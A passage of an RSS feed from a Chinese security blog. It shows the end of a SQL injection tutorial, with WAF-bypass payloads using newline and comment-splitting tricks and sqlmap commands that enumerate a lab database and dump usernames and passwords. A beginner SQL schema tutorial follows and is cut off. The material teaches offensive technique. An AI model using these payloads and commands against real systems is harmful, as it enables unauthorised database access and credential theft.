&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM users WHERE user_id = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$id&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在这里的过滤中，WAF使用了&lt;code&gt;i&lt;/code&gt;修正符匹配正则&lt;code&gt;select.*from&lt;/code&gt;，意味着大小写绕过无效&lt;/p&gt;
&lt;p&gt;然而，他忘记了使用&lt;code&gt;s&lt;/code&gt;修正符！&lt;/p&gt;
&lt;p&gt;元字符&lt;code&gt;.&lt;/code&gt;可以匹配除换行符以外的任意单个字符，没有使用&lt;code&gt;s&lt;/code&gt;修正符，所以 &lt;code&gt;.&lt;/code&gt; 无法匹配换行符！&lt;/p&gt;
&lt;p&gt;而对于MySQL来说，换行符和空格、制表符一样，都是合法的空白分隔符&lt;/p&gt;
&lt;p&gt;所以，我们可以在查询语句里面插入换行符绕过：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union select 1,table_name%0afrom information_schema.tables where table_schema=&amp;#39;dvwa&amp;#39; #
												 ↑
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;9-多参数请求拼凑&#34;&gt;#9 多参数请求拼凑
&lt;/h2&gt;&lt;p&gt;部分表单（比如登录界面）是通过拼凑用户输入的内容来进行查询的，比如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$param_a&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$param_b&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$_GET&lt;/span&gt;[&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;$sql&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;SELECT * FROM products WHERE type = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$param_a&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39; AND detail = &amp;#39;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;$param_b&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;.&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;&amp;#39;&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;WAF可能对单个的内容做了过滤，这时候我们就可以把注入语句拆分&lt;/p&gt;
&lt;p&gt;a部分输入：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1&amp;#39; union/*
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;b部分输入：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;*/select 1,2#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样拼凑之后的sql语句就是：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;SELECT&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;FROM&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;products&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;WHERE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;type&lt;/span&gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;union&lt;/span&gt;&lt;span style=&#34;color:#7f848e&#34;&gt;/*&amp;#39; AND detail = &amp;#39;*/&lt;/span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;#&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;														  		  ~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们就把中间b的部分注释掉了，并且绕过了WAF，成功注入了查询语句&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:#2c8af0;font-size:20px&#34;&gt;&lt;strong&gt;恭喜，你现在已经学会了手工注入！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:aqua;font-size:20px&#34;&gt;&lt;strong&gt;呃，可是这也太麻烦了吧，又要判断这个又要试那个的，难道没有更简单的方法吗?&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span style=&#34;color:#2c8af0;font-size:30px&#34;&gt;&lt;strong&gt;当然是有的！那就是使用自动化注入工具&amp;ndash;SqlMap！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h1 id=&#34;sqlmap使用&#34;&gt;SqlMap使用
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;下载地址：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;git clone https://github.com/sqlmapproject/sqlmap.git
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;基本使用步骤&#34;&gt;基本使用步骤
&lt;/h2&gt;&lt;h3 id=&#34;检查注入点&#34;&gt;检查注入点
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-u：指定目标url&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;batch：全自动模式，问什么都答对(y)&lt;/strong&gt;&lt;/mark&gt;`&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627092400221.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627092400221&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;sqlmap指出它通过四种不同的方式成功注入了目标：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;boolean-based blind&lt;/code&gt; (布尔盲注)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;error-based&lt;/code&gt; (报错注入)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;time-based blind&lt;/code&gt; (时间盲注)&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;UNION query&lt;/code&gt; (联合查询注入)&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而由布尔盲注的&lt;code&gt;payload:id=33 AND 3115=3115&lt;/code&gt;可以看出是数字型注入（id=33周围无单引号）&lt;/p&gt;
&lt;p&gt;由联合查询注入的&lt;code&gt;target URL appears to have 15 columns in query&lt;/code&gt;可以知道一共有十五个字段&lt;/p&gt;
&lt;h3 id=&#34;爆破数据库信息&#34;&gt;爆破数据库信息
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-dbs：爆破所有的数据库名称&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --dbs --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627093550491.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627093550491&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;&amp;ndash;current-db：爆破当前数据库名称&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --current-db --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627093857366.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627093857366&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;结果说明现在的表名为cms&lt;/p&gt;
&lt;h3 id=&#34;爆破指定数据库的所有表名&#34;&gt;爆破指定数据库的所有表名
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-D：指定数据库名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;tables：枚举所有表&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -D cms --tables  --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627094523174.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627094523174&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;爆破指定表的所有列名&#34;&gt;爆破指定表的所有列名
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-T：指定表名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;colums：枚举所有列&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意此处要先指定数据库名，再指定表名：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -D cms -T cms_users --columns  --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627094938971.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627094938971&#34;
	
	
&gt;#### extractvalue (XML_document, XPath_string)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;第一个参数：&lt;code&gt;XML_document&lt;/code&gt; 是目标XML文档&lt;/li&gt;
&lt;li&gt;第二个参数：&lt;code&gt;XPath_string&lt;/code&gt; &lt;strong&gt;是该XML文档的路径，如果写入其他格式就会报错，并且返回非法格式的内容&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;select&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;user&lt;/span&gt;,&lt;span style=&#34;color:#e06c75&#34;&gt;password&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;from&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;users&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;where&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;user_id&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;and&lt;/span&gt; (&lt;span style=&#34;color:#e06c75&#34;&gt;extractvalue&lt;/span&gt;(&lt;span style=&#34;color:#d19a66&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#d19a66&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#e06c75&#34;&gt;x7e&lt;/span&gt;));
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;由于0x7e是~的十六进制，而~不属于xpath语法格式，因此会报出xpath语法错误&lt;/p&gt;
&lt;h4 id=&#34;updatexml-xml_document-xpath_string-new_value-1&#34;&gt;updatexml (XML_document, XPath_string, new_value)
&lt;/h4&gt;&lt;h3 id=&#34;打印指定列名的字段数据&#34;&gt;打印指定列名的字段数据
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;-C：指定列名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;dump：取出指定列名的所有数据&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -D cms -T cms_users -C username,password --dump --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627095213209.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627095213209&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;查看用户权限&#34;&gt;查看用户权限
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;users：列出数据库管理系统用户&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --users --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101333092.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627101333092&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;current-user：查看当前连接数据库用户&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --current-user --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101406633.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627101406633&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;&amp;ndash;is-dba：判断当前用户是否是DBA（数据库管理员）&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; --is-dba --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;C:%5cUsers%5clenovo%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20250627101434203.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627101434203&#34;
	
	
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果是数据库管理员，就代表有写的权限，可以在服务器上面写入一句话木马&lt;/p&gt;&lt;/blockquote&gt;
&lt;h3 id=&#34;查看数据库密码&#34;&gt;查看数据库密码
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;mark&gt;&amp;ndash;password：自动寻找有没有常见的用户名和密码列&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以看成是一系列操作（找到password表和dump）的自动化&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -u http://192.168.204.133/show.php?id&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#d19a66&#34;&gt;33&lt;/span&gt; -passwords
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627111514038.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;结合burpsuite使用&#34;&gt;结合burpsuite使用
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;有的时候我们需要对一个表单进行注入，这时候就可以使用post注入&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;mark&gt;-r：从文件加载HTTP请求，sqlmap可以从一个文本文件中获取HTTP请求，这样就可以跳过设置一些其他参数（比如cookie，POST数据，等等）&lt;/mark&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;拦截请求&#34;&gt;拦截请求
&lt;/h3&gt;&lt;p&gt;在设置代理后，表单随便填一个内容提交，查看post请求内容，复制另存为.txt&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627100838668.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627100838668&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;进行爆破&#34;&gt;进行爆破
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sqlmap -r post.txt --dbs --batch
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250627101026867.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20250627101026867&#34;
	
	
&gt;&lt;/p&gt;
&lt;p&gt;同样可以得到正确结果&lt;/p&gt;
</description>
        </item>
        <item>
        <title>快速入门SQL</title>
        <link>https://blog.928330.xyz/p/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8sql/</link>
        <pubDate>Tue, 03 Jun 2025 01:14:02 +0800</pubDate>
        
        <guid>https://blog.928330.xyz/p/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8sql/</guid>
        <description>&lt;h2 id=&#34;模式&#34;&gt;模式
&lt;/h2&gt;&lt;h3 id=&#34;定义模式&#34;&gt;定义模式
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;CREATE SCHEMA 模式名 AUTHORIZATION 用户名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;eg:为用户ZHANG定义一个S-T模式：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SCHEMA&lt;/span&gt; &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;S-T&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AUTHORIZATION&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ZHANG&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;eg:为用户ZHANG定义一个未命名的模式：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#c678dd&#34;&gt;CREATE&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;SCHEMA&lt;/span&gt; &lt;span style=&#34;color:#c678dd&#34;&gt;AUTHORIZATION&lt;/span&gt; &lt;span style=&#34;color:#e06c75&#34;&gt;ZHANG&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;未定义模式名称的时候，默认模式为用户名&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;删除模式&#34;&gt;删除模式
&lt;/h3&gt;&lt;p&gt;&lt;mark&gt;&lt;strong&gt;DROP SCHEAM 模式名&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;普通&lt;/strong&gt;：用于删除空的模式，如果模式下面有对象（表、视图）等，拒绝删除&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;DROP SCHEAM 模式名 CASCADE&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;级联&lt;/strong&gt;：把模式里面的对象一并删除&lt;/p&gt;
&lt;p&gt;&lt;mark&gt;&lt;strong&gt;DROP SCHEAM 模式名 RESTRICT&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;限制&lt;/strong&gt;：会把对象转移到公共模式保留并删除模式，但如果对象和模式有联系，则拒绝删除模式&lt;/p&gt;
&lt;h2 id=&#34;基本表&#34;&gt;基本表
&lt;/h2&gt;&lt;h3 id=&#34;定义基本元素&#34;&gt;定义基本元素
&lt;/h3&gt;&lt;h4 id=&#34;数据类型&#34;&gt;数据类型
&lt;/h4&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;数据类型&lt;/th&gt;
          &lt;th style=&#34;text-align: center&#34;&gt;表示内容&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;CHAR(n)&lt;/td&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;长度为n的字符型&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: center&#34;&gt;VARCHAR(n)&lt;/td&gt;
